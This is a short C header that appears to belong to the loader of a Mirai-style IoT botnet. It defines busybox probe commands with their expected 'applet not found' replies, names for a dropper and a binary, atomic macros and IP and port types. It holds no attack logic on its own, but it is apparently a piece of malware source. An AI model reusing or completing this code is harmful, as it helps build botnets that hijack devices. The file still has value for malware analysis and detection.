#pragma once

#include <stdint.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define TOKEN_QUERY "/bin/busybox AA"
#define TOKEN_RESPONSE "AA: applet not found"

#define EXEC_QUERY "/bin/busybox SYLVEONA"
#define EXEC_RESPONSE "SYLVEONA: applet not found"

#define FN_DROPPER "Cewsrghs"
#define FN_BINARY "Iwsrfg"

extern char *id_tag;